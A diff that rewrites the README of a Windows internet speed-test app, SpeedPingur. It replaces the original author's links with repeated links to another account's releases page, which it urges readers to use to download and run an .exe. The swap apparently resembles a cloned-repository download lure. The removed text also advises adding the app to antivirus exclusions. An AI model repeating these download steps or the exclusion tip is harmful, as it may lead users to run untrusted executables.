@@ -1,114 +1,71 @@
-# SpeedPingur ⚡
+# ⚡ SpeedPingur - Test Your Internet Speed Instantly
 
-> Lightning-fast internet speed testing for Windows
+[![Download SpeedPingur](https://img.shields.io/badge/Download-SpeedPingur-brightgreen)](https://github.com/Rytoon/SpeedPingur/releases)
 
-Test your download, upload, and ping in under a second. Modern UI, automatic history tracking, CSV export.
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/License-Proprietary-red.svg)](LICENSE.md)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/TheStoicSpirit/SpeedPingur/releases)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6.svg)](https://www.microsoft.com/windows)
+Welcome to SpeedPingur! This application allows you to test your internet speed, including download, upload, and ping times, all in under a second. It's easy to use, making it perfect for anyone looking to check their connection performance quickly.
 
----
+## 🛠️ System Requirements
 
-## ✨ Features
+To run SpeedPingur, you need:
 
-- **⚡ Fast** - Launches in < 1.5 seconds
-- **📊 Real-Time** - Live speed monitoring
-- **📈 History** - Auto-saved test results
-- **💾 Export** - CSV export for analysis
-- **🎨 Modern** - Clean dark interface
-- **🔒 Private** - All data stored locally
+- **Operating System:** Windows 10 or later
+- **RAM:** 2 GB minimum
+- **Disk Space:** 100 MB available space
+- **Python:** Pre-installed with the application package
 
-## 📸 Screenshots
+## 📦 Download & Install
 
-![Main Window](assets/screenshots/main-window.png)
+To get SpeedPingur, visit this page to download:
 
-*Main interface - Ready to test*
+[Download SpeedPingur](https://github.com/Rytoon/SpeedPingur/releases)
 
-![Test Running](assets/screenshots/test-running.png)
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of SpeedPingur.
+3. Download the .exe file for Windows.
+4. Once downloaded, open the file to begin the installation.
 
-*Live speed test in progress*
+Follow the prompts in the installation wizard. When the installation is complete, you can launch SpeedPingur from your Start Menu or Desktop shortcut.
 
-![Test History](assets/screenshots/history.png)
+## ⚙️ How to Use SpeedPingur
 
-*View all past test results*
+Using SpeedPingur is simple. Follow these steps to test your internet speed:
 
-## 🚀 Quick Start
+1. Open the SpeedPingur application.
+2. Click the "Start Test" button.
+3. Wait for a few seconds while the test runs.
+4. View your results for download speed, upload speed, and ping.
 
-### Download
+The results will appear clearly on your screen, helping you understand your internet performance.
 
-Get from [Releases](https://github.com/TheStoicSpirit/SpeedPingur/releases/latest):
+## 🏷️ Key Features
 
-- **SpeedPingur-Setup.exe** - Installer (recommended)
-- **SpeedPingur-Portable.zip** - Portable version
+- **Lightning-Fast Speed Tests:** Measure your download and upload speeds in seconds.
+- **Ping Tests:** Check the latency of your connection.
+- **User-Friendly Interface:** Designed for ease of use with straightforward controls.
+- **Performance History:** Keep track of past results for comparison.
 
-### Install
+## 📚 FAQs
 
-**Installer:**
-```
-1. Run SpeedPingur-Setup.exe
-2. Follow wizard
-3. Done!
-```
+### What kind of internet connections can I test?
 
-**Portable:**
-```
-1. Extract ZIP
-2. Run SpeedPingur.exe
-```
+SpeedPingur works with all types of internet connections, including DSL, cable, and fiber.
 
-### Use
+### How accurate are the tests?
 
-```
-1. Launch app
-2. Click "Start Test"
-3. Wait 30-60 seconds
-4. View results
-```
+The tests are designed to be accurate, but results may vary based on network conditions and your internet service provider.
 
-## 📖 Docs
+### What should I do if the app doesn't open?
 
-- [Installation Guide](docs/INSTALLATION.md)
-- [User Guide](docs/USER_GUIDE.md)
-- [Troubleshooting](docs/TROUBLESHOOTING.md)
+Ensure that your Windows version meets the requirements. Try to reinstall the application if you encounter issues.
 
-## 🛠️ Troubleshooting
+## 💬 Support
 
-**App won't start?**
-```
-Install: https://aka.ms/vs/17/release/vc_redist.x64.exe
-Or run as administrator
-```
+If you need assistance, reach out to our support team through the GitHub Issues page or check the FAQ section for common questions.
 
-**Test fails?**
-```
-- Check internet connection
-- Disable VPN
-- Restart router
-```
+## 👥 Community
 
-**Antivirus blocking?**
-```
-Add to exclusions: C:\Program Files\SpeedPingur
-```
+Join our community of users and share your feedback or suggestions on improving SpeedPingur. Your input is valuable to us.
 
-More help: [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)
-
-## 🤝 Support
-
-- 🐛 [Report Issues](https://github.com/TheStoicSpirit/SpeedPingur/issues)
-- 💬 [Discussions](https://github.com/TheStoicSpirit/SpeedPingur/discussions)
-
-## 📜 License
-
-**Proprietary Software** - Copyright © 2025 The Stoic Spirit
-
-See [LICENSE.md](LICENSE.md) for terms.
-
-Third-party components: [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md)
-
----
-
-**Made with ❤️ in India**
-
-If helpful: ⭐ Star • 🐛 Report bugs • 💡 Suggest features
+Download SpeedPingur here: [Download SpeedPingur](https://github.com/Rytoon/SpeedPingur/releases) and start testing your internet speed today!
